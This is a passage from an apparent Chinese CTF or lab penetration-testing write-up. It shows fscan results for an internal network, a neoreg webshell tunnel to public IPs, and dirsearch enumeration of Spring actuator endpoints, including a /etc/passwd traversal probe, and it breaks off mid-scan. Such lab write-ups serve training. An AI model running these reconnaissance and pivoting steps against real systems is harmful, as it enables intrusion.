</span></span></span><span class=line><span class=cl><span class=err></span>│   / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __    │<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>│  / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /    │<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>│ / /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;     │<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>│ <span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>   │<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>└──────────────────────────────────────────────┘<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      Fscan Version: 2.0.0<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 暴力破解线程数: <span class=m>1</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 开始信息扫描<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> CIDR范围: 172.28.23.0-172.28.23.255<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 生成IP范围: 172.28.23.0.%!d<span class=o>(</span><span class=nv>string</span><span class=o>=</span>172.28.23.255<span class=o>)</span> - %!s<span class=o>(</span>MISSING<span class=o>)</span>.%!d<span class=o>(</span>MISSING<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 解析CIDR 172.28.23.17/24 -&gt; IP范围 172.28.23.0-172.28.23.255<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 最终有效主机数量: <span class=m>256</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 开始主机扫描<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:25<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 正在尝试无监听ICMP探测...<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:26<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 当前用户权限不足,无法发送ICMP包<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:26<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 切换为PING方式探测...<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:26<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标 172.28.23.26    存活 <span class=o>(</span>ICMP<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:26<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标 172.28.23.33    存活 <span class=o>(</span>ICMP<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:26<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标 172.28.23.17    存活 <span class=o>(</span>ICMP<span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 存活主机数量: <span class=m>3</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 有效端口数量: <span class=m>233</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.17:80<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.33:22<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.26:22<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.26:21<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.17:22<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.26:80<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.33:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 端口开放 172.28.23.17:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.33:22 <span class=o>=</span>&gt; <span class=o>[</span>ssh<span class=o>]</span> 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class=p>;</span> protocol 2.0 Banner:<span class=o>[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.26:22 <span class=o>=</span>&gt; <span class=o>[</span>ssh<span class=o>]</span> 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class=p>;</span> protocol 2.0 Banner:<span class=o>[</span>SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.26:21 <span class=o>=</span>&gt; <span class=o>[</span>ftp<span class=o>]</span> 版本:3.0.3 产品:vsftpd 系统:Unix Banner:<span class=o>[</span><span class=m>220</span> <span class=o>(</span>vsFTPd 3.0.3<span class=o>)</span>.<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:32<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.17:22 <span class=o>=</span>&gt; <span class=o>[</span>ssh<span class=o>]</span> 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class=p>;</span> protocol 2.0 Banner:<span class=o>[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:37<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.17:8080 <span class=o>=</span>&gt; <span class=o>[</span>http<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:37<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.33:8080 <span class=o>=</span>&gt; <span class=o>[</span>http<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.17:80 <span class=o>=</span>&gt; <span class=o>[</span>http<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 服务识别 172.28.23.26:80 <span class=o>=</span>&gt; <span class=o>[</span>http<span class=o>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 存活端口数量: <span class=m>8</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 开始漏洞扫描<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> 加载的插件: ftp, ssh, webpoc, webtitle<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:<span class=s2>&#34;&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login<span class=p>;</span><span class=nv>jsessionid</span><span class=o>=</span>C0147F5D5100AFE63969477D86B84D8F<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:38<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 匿名登录成功!<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:39<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 网站标题 http://172.28.23.33:8080/login<span class=p>;</span><span class=nv>jsessionid</span><span class=o>=</span>C0147F5D5100AFE63969477D86B84D8F 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:39<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标: http://172.28.23.17:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞类型: poc-yaml-thinkphp5023-method-rce<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞名称: poc1<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  详细信息:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>	links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:40<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标: http://172.28.23.33:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞类型: poc-yaml-spring-actuator-heapdump-file<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞名称: <span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  详细信息:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>	author:AgeloVito<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>	links:https://www.cnblogs.com/wyb628/p/8567610.html<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>2025-03-08 20:54:40<span class=o>]</span> <span class=o>[</span>SUCCESS<span class=o>]</span> 目标: http://172.28.23.33:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞类型: poc-yaml-springboot-env-unauth<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  漏洞名称: spring2<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  详细信息:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>	links:https://github.com/LandGrey/SpringBootVulExploit<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>然后将流量代理出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>python neoreg.py -k shell -p <span class=m>8888</span> -u http://8.130.71.207:8080/tunnel.php<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>python3 neoreg.py -k shell -u http://39.101.64.150:8080/tunnel.php<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308211027-1rxhr8j.png alt=image>​</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308213146-txofo1i.png alt=image>​</p><p>结合一下，很明显是heapdump</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>PS D:<span class=se>\C</span>TFtools<span class=se>\W</span>eb<span class=se>\d</span>irsearch-0.4.3<span class=se>\d</span>irsearch-0.4.3<span class=se>\d</span>irsearch-0.4.3&gt; python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  _<span class=p>|</span>. _ _  _  _  _ _<span class=p>|</span>_    v0.4.3<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span> <span class=o>(</span>_<span class=o>||</span><span class=p>|</span> _<span class=o>)</span> <span class=o>(</span>/_<span class=o>(</span>_<span class=o>||</span> <span class=o>(</span>_<span class=p>|</span> <span class=o>)</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Extensions: php, aspx, jsp, html, js <span class=p>|</span> HTTP method: GET <span class=p>|</span> Threads: <span class=m>25</span> <span class=p>|</span> Wordlist size: <span class=m>11460</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Output File: D:<span class=se>\C</span>TFtools<span class=se>\W</span>eb<span class=se>\d</span>irsearch-0.4.3<span class=se>\d</span>irsearch-0.4.3<span class=se>\d</span>irsearch-0.4.3<span class=se>\r</span>eports<span class=se>\h</span>ttp_172.28.23.33_8080<span class=se>\_</span>25-03-08_21-30-38.txt<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>Target: http://172.28.23.33:8080/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:30:38<span class=o>]</span> Starting:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:09<span class=o>]</span> <span class=m>404</span> -   96B  - /<span class=p>;</span>/login<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:10<span class=o>]</span> <span class=m>400</span> -  435B  - /<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\.</span>.<span class=se>\e</span>tc<span class=se>\p</span>asswd<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:12<span class=o>]</span> <span class=m>400</span> -  435B  - /a%5c.aspx<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/<span class=p>;</span>/auditevents<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>200</span> -    2KB - /actuator<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/auditLog<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  105B  - /actuator/<span class=p>;</span>/beans<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/<span class=p>;</span>/caches<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  110B  - /actuator/<span class=p>;</span>/conditions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/<span class=p>;</span>/configprops<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  121B  - /actuator/<span class=p>;</span>/configurationMetadata<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  104B  - /actuator/<span class=p>;</span>/dump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  103B  - /actuator/<span class=p>;</span>/env<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  124B  - /actuator/<span class=p>;</span>/exportRegisteredServices<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/<span class=p>;</span>/events<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/features<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/<span class=p>;</span>/flyway<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/<span class=p>;</span>/healthcheck<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/<span class=p>;</span>/health<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/heapdump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/<span class=p>;</span>/jolokia<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  104B  - /actuator/<span class=p>;</span>/info<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  116B  - /actuator/<span class=p>;</span>/integrationgraph<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  109B  - /actuator/<span class=p>;</span>/httptrace<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  109B  - /actuator/<span class=p>;</span>/liquibase<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/<span class=p>;</span>/logfile<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/<span class=p>;</span>/metrics<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/<span class=p>;</span>/loggers<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/mappings<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  118B  - /actuator/<span class=p>;</span>/registeredServices<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  110B  - /actuator/<span class=p>;</span>/prometheus<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  107B  - /actuator/<span class=p>;</span>/refresh<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  113B  - /actuator/<span class=p>;</span>/loggingConfig<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  117B  - /actuator/<span class=p>;</span>/releaseAttributes<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  117B  - /actuator/<span class=p>;</span>/resolveAttributes<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  114B  - /actuator/<span class=p>;</span>/scheduledtasks<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/sessions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  108B  - /actuator/<span class=p>;</span>/shutdown<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  113B  - /actuator/<span class=p>;</span>/springWebflow<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  103B  - /actuator/<span class=p>;</span>/sso<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  111B  - /actuator/<span class=p>;</span>/ssoSessions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  110B  - /actuator/<span class=p>;</span>/statistics<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/<span class=p>;</span>/status<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  110B  - /actuator/<span class=p>;</span>/threaddump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  105B  - /actuator/<span class=p>;</span>/trace<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  106B  - /actuator/auditLog<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  109B  - /actuator/auditevents<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>200</span> -   20B  - /actuator/caches<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>200</span> -   91KB - /actuator/beans<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  102B  - /actuator/dump<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  119B  - /actuator/configurationMetadata<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>200</span> -    7KB - /actuator/env<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>200</span> -   99KB - /actuator/conditions<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=o>[</span>21:31:15<span class=o>]</span> <span class=m>404</span> -  122B  - /actuator/exportRegisteredServices<span class=err>
